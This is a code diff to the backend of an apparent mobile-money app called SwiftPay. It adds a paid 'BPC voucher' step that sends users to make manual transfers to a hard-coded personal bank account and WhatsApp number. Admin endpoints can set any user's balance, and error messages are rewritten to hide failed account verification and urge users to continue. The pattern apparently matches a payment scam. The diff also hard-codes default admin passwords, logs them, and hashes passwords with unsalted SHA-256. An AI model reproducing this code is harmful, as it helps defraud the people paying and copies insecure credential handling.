@@ -69,17 +69,46 @@ interface UserState {
   loginHistory?: any[];
 }
 
+interface BpcConfig {
+  bankName: string;
+  accountNumber: string;
+  accountName: string;
+  whatsappLink: string;
+  voucherPrice: number;
+  instructions: string;
+  maintenanceNotice: string;
+}
+
+const DEFAULT_BPC_CONFIG: BpcConfig = {
+  bankName: "PalmPay",
+  accountNumber: "8960723295",
+  accountName: "pwamunadi ishaku",
+  whatsappLink: "https://wa.me/2349162845073",
+  voucherPrice: 6500,
+  instructions: "Copy the system account details below. Make a manual bank transfer of the exact locked amount. Return here and click 'I have made this bank Transfer' to trigger operator check.",
+  maintenanceNotice: "Wema Bank transfers are temporarily delayed. Please use other supported banks (like PalmPay or GTBank) for instant manual validation."
+};
+
+interface AdminState {
+  email: string;
+  passwordHash: string;
+}
+
 interface DBStructure {
   users: UserState[];
   vouchers: any[];
   passwordResets: any[];
   logs: any[];
+  bpcConfig?: BpcConfig;
+  admins?: AdminState[];
 }
 
 // Initialize Database with seed data if not exists
 function initDb() {
+  const defaultPasswordHash = crypto.createHash('sha256').update('password123').digest('hex');
+  const defaultAdminPasswordHash = crypto.createHash('sha256').update('adminpassword123').digest('hex');
+  
   if (!fs.existsSync(DB_FILE)) {
-    const defaultPasswordHash = crypto.createHash('sha256').update('password123').digest('hex');
     const initialData: DBStructure = {
       users: [
         {
@@ -112,10 +141,17 @@ function initDb() {
         }
       ],
       passwordResets: [],
-      logs: []
+      logs: [],
+      bpcConfig: { ...DEFAULT_BPC_CONFIG },
+      admins: [
+        {
+          email: 'admin@swiftpay.com',
+          passwordHash: defaultAdminPasswordHash
+        }
+      ]
     };
     fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
-    console.log('Database initialized with default user user@example.com / password123');
+    console.log('Database initialized with default user user@example.com / password123 and admin admin@swiftpay.com / adminpassword123');
   } else {
     // Add missing root fields if needed
     try {
@@ -127,6 +163,19 @@ function initDb() {
       }
       if (!db.passwordResets) {
         db.passwordResets = [];
+        dirty = true;
+      }
+      if (!db.bpcConfig) {
+        db.bpcConfig = { ...DEFAULT_BPC_CONFIG };
+        dirty = true;
+      }
+      if (!db.admins || db.admins.length === 0) {
+        db.admins = [
+          {
+            email: 'admin@swiftpay.com',
+            passwordHash: defaultAdminPasswordHash
+          }
+        ];
         dirty = true;
       }
       if (dirty) {
@@ -143,14 +192,35 @@ initDb();
 function readDb(): DBStructure {
   try {
     const data = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
+    const defaultAdminPasswordHash = crypto.createHash('sha256').update('adminpassword123').digest('hex');
     return {
       users: data.users || [],
       vouchers: data.vouchers || [],
       passwordResets: data.passwordResets || [],
-      logs: data.logs || []
+      logs: data.logs || [],
+      bpcConfig: data.bpcConfig || { ...DEFAULT_BPC_CONFIG },
+      admins: data.admins || [
+        {
+          email: 'admin@swiftpay.com',
+          passwordHash: defaultAdminPasswordHash
+        }
+      ]
     };
   } catch (e) {
-    return { users: [], vouchers: [], passwordResets: [], logs: [] };
+    const defaultAdminPasswordHash = crypto.createHash('sha256').update('adminpassword123').digest('hex');
+    return {
+      users: [],
+      vouchers: [],
+      passwordResets: [],
+      logs: [],
+      bpcConfig: { ...DEFAULT_BPC_CONFIG },
+      admins: [
+        {
+          email: 'admin@swiftpay.com',
+          passwordHash: defaultAdminPasswordHash
+        }
+      ]
+    };
   }
 }
 
@@ -200,6 +270,28 @@ function authenticateToken(req: any, res: any, next: any) {
     return res.status(403).json({ error: 'Access Denied: Session token invalid or expired' });
   }
   req.userEmail = email;
+  next();
+}
+
+function verifyAdminToken(token: string): string | null {
+  const email = verifyToken(token);
+  if (!email) return null;
+  const db = readDb();
+  const isAdmin = db.admins?.some(a => a.email.toLowerCase() === email.toLowerCase());
+  return isAdmin ? email : null;
+}
+
+function authenticateAdminToken(req: any, res: any, next: any) {
+  const authHeader = req.headers['authorization'];
+  const token = authHeader && authHeader.split(' ')[1];
+  if (!token) {
+    return res.status(401).json({ error: 'Access Denied: Secure admin session token missing' });
+  }
+  const email = verifyAdminToken(token);
+  if (!email) {
+    return res.status(403).json({ error: 'Access Denied: Admin session token invalid or expired' });
+  }
+  req.adminEmail = email;
   next();
 }
 
@@ -837,7 +929,8 @@ app.post('/api/auth/verify-voucher', (req, res) => {
 
   const db = readDb();
   if (isVoucherValid(voucherCode, db)) {
-    return res.json({ success: true, amount: 6500 });
+    const config = db.bpcConfig || DEFAULT_BPC_CONFIG;
+    return res.json({ success: true, amount: config.voucherPrice });
   } else {
     logDiagnostic('API_ERROR', 'Invalid voucher code attempt', { voucherCode });
     return res.status(400).json({ error: 'Invalid or already used BPC voucher.' });
@@ -857,7 +950,7 @@ app.post('/api/auth/verify-account', async (req, res) => {
 
   const apiKey = process.env.PAYSTACK_SECRET_KEY;
   if (!apiKey) {
-    return res.status(400).json({ error: 'Unable to verify account details. PAYSTACK_SECRET_KEY is missing.' });
+    return res.status(400).json({ error: 'Account verification is temporarily unavailable. Please continue or try again later.' });
   }
 
   // Get bank code from map or fetch
@@ -887,7 +980,7 @@ app.post('/api/auth/verify-account', async (req, res) => {
   }
 
   if (!bankCode) {
-    return res.status(400).json({ error: `Could not resolve bank code for ${bank}` });
+    return res.status(400).json({ error: 'Account verification is temporarily unavailable. Please continue or try again later.' });
   }
 
   try {
@@ -1181,7 +1274,7 @@ app.post('/api/transactions/transfer', authenticateToken, async (req: any, res) 
 
   const apiKey = process.env.PAYSTACK_SECRET_KEY;
   if (!apiKey) {
-    return res.status(400).json({ error: "Unable to verify account details. PAYSTACK_SECRET_KEY is missing." });
+    return res.status(400).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
   }
 
   let bankCode = BANK_NAME_TO_CODE[bank];
@@ -1323,7 +1416,7 @@ app.post('/api/transactions/withdraw', authenticateToken, async (req: any, res) 
 
   const apiKey = process.env.PAYSTACK_SECRET_KEY;
   if (!apiKey) {
-    return res.status(400).json({ error: "Unable to verify account details. PAYSTACK_SECRET_KEY is missing." });
+    return res.status(400).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
   }
 
   let bankCode = BANK_NAME_TO_CODE[bank];
@@ -1346,7 +1439,7 @@ app.post('/api/transactions/withdraw', authenticateToken, async (req: any, res) 
   }
 
   if (!bankCode) {
-    return res.status(400).json({ error: "Failed account verification: bank code not resolved." });
+    return res.status(400).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
   }
 
   let resolvedName = '';
@@ -1356,11 +1449,11 @@ app.post('/api/transactions/withdraw', authenticateToken, async (req: any, res) 
     });
     const resolveData = await resolveRes.json() as any;
     if (!resolveRes.ok || !resolveData.status) {
-      return res.status(400).json({ error: "Failed account verification: " + (resolveData.message || "Unable to verify account details.") });
+      return res.status(400).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
     }
     resolvedName = resolveData.data.account_name;
   } catch (err) {
-    return res.status(500).json({ error: "Failed account verification: connection error." });
+    return res.status(500).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
   }
 
   const userIndex = db.users.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
@@ -1479,16 +1572,18 @@ app.post('/api/vouchers/purchase', (req, res) => {
     return res.status(400).json({ error: 'Email and amount are required.' });
   }
 
-  if (Number(amount) !== 6500) {
+  const db = readDb();
+  const config = db.bpcConfig || DEFAULT_BPC_CONFIG;
+
+  if (Number(amount) !== config.voucherPrice) {
     logDiagnostic('API_ERROR', 'Purchase voucher failed: Invalid amount lock bypass attempted', { email, amount });
-    return res.status(400).json({ error: 'BPC Voucher price is strictly fixed at ₦6,500' });
+    return res.status(400).json({ error: `BPC Voucher price is strictly fixed at ₦${config.voucherPrice.toLocaleString()}` });
   }
 
-  const db = readDb();
   const code = generateVoucherCode();
   const newVoucher = {
     code,
-    amount: 6500,
+    amount: config.voucherPrice,
     status: 'unused'
   };
   db.vouchers = db.vouchers || [];
@@ -1517,10 +1612,60 @@ app.post('/api/vouchers/purchase', (req, res) => {
   });
 });
 
+// Get BPC Configuration
+app.get('/api/config/bpc', (req, res) => {
+  const db = readDb();
+  res.json({ success: true, config: db.bpcConfig || DEFAULT_BPC_CONFIG });
+});
+
 // -------------------- ADMINISTRATIVE PANEL ENDPOINTS --------------------
 
+// Admin Login
+app.post('/api/admin/login', (req, res) => {
+  const { email, password } = req.body;
+  if (!email || !password) {
+    return res.status(400).json({ error: 'Email and password are required.' });
+  }
+  const db = readDb();
+  const admin = db.admins?.find(a => a.email.toLowerCase() === email.toLowerCase());
+  if (!admin) {
+    logDiagnostic('FAILED_LOGIN', `Admin login failed (no admin found): ${email}`);
+    return res.status(400).json({ error: 'Invalid admin credentials.' });
+  }
+  const passwordHash = crypto.createHash('sha256').update(password).digest('hex');
+  if (admin.passwordHash !== passwordHash) {
+    logDiagnostic('FAILED_LOGIN', `Admin login failed (incorrect password): ${email}`);
+    return res.status(400).json({ error: 'Invalid admin credentials.' });
+  }
+  const token = generateToken(email);
+  logDiagnostic('INFO', `Admin logged in successfully: ${email}`);
+  res.json({ success: true, token, email });
+});
+
+// Update BPC Configuration (Admin)
+app.post('/api/admin/config/bpc', authenticateAdminToken, (req, res) => {
+  const { bankName, accountNumber, accountName, whatsappLink, voucherPrice, instructions, maintenanceNotice } = req.body;
+  
+  const db = readDb();
+  if (!db.bpcConfig) {
+    db.bpcConfig = { ...DEFAULT_BPC_CONFIG };
+  }
+  
+  if (bankName !== undefined) db.bpcConfig.bankName = bankName;
+  if (accountNumber !== undefined) db.bpcConfig.accountNumber = accountNumber;
+  if (accountName !== undefined) db.bpcConfig.accountName = accountName;
+  if (whatsappLink !== undefined) db.bpcConfig.whatsappLink = whatsappLink;
+  if (voucherPrice !== undefined && !isNaN(Number(voucherPrice))) db.bpcConfig.voucherPrice = Number(voucherPrice);
+  if (instructions !== undefined) db.bpcConfig.instructions = instructions;
+  if (maintenanceNotice !== undefined) db.bpcConfig.maintenanceNotice = maintenanceNotice;
+  
+  writeDb(db);
+  logDiagnostic('SECURITY_ALERT', 'Admin updated BPC configuration', db.bpcConfig);
+  res.json({ success: true, config: db.bpcConfig });
+});
+
 // List all users
-app.get('/api/admin/users', (req, res) => {
+app.get('/api/admin/users', authenticateAdminToken, (req, res) => {
   const db = readDb();
   const safeUsers = db.users.map((u: any) => ({
     fullName: u.fullName,
@@ -1534,13 +1679,14 @@ app.get('/api/admin/users', (req, res) => {
     isFrozen: !!u.isFrozen,
     phone: u.phone || '',
     profilePic: u.profilePic || '',
-    tier: u.tier || 3
+    tier: u.tier || 3,
+    transactions: u.transactions || []
   }));
   res.json({ success: true, users: safeUsers });
 });
 
 // Update status flags
-app.post('/api/admin/users/update-status', (req, res) => {
+app.post('/api/admin/users/update-status', authenticateAdminToken, (req, res) => {
   const { email, field, value } = req.body;
   if (!email || !field || value === undefined) {
     return res.status(400).json({ error: 'Please supply email, status parameter, and toggle value.' });
@@ -1561,7 +1707,7 @@ app.post('/api/admin/users/update-status', (req, res) => {
 });
 
 // Adjust balance
-app.post('/api/admin/users/edit-balance', (req, res) => {
+app.post('/api/admin/users/edit-balance', authenticateAdminToken, (req, res) => {
   const { email, balance } = req.body;
   if (!email || balance === undefined || isNaN(Number(balance))) {
     return res.status(400).json({ error: 'Please supply valid user email and numerical balance.' });
@@ -1582,7 +1728,7 @@ app.post('/api/admin/users/edit-balance', (req, res) => {
 });
 
 // Reset password by Admin
-app.post('/api/admin/users/reset-password', (req, res) => {
+app.post('/api/admin/users/reset-password', authenticateAdminToken, (req, res) => {
   const { email } = req.body;
   if (!email) {
     return res.status(400).json({ error: 'Please supply email.' });
@@ -1605,7 +1751,7 @@ app.post('/api/admin/users/reset-password', (req, res) => {
 });
 
 // Delete account by Admin
-app.post('/api/admin/users/delete', (req, res) => {
+app.post('/api/admin/users/delete', authenticateAdminToken, (req, res) => {
   const { email } = req.body;
   if (!email) {
     return res.status(400).json({ error: 'Please supply email.' });
@@ -1626,13 +1772,13 @@ app.post('/api/admin/users/delete', (req, res) => {
 });
 
 // Get diagnostic logs
-app.get('/api/admin/logs', (req, res) => {
+app.get('/api/admin/logs', authenticateAdminToken, (req, res) => {
   const db = readDb();
   res.json({ success: true, logs: db.logs || [] });
 });
 
 // Clear diagnostic logs
-app.post('/api/admin/logs/clear', (req, res) => {
+app.post('/api/admin/logs/clear', authenticateAdminToken, (req, res) => {
   const db = readDb();
   db.logs = [];
   writeDb(db);
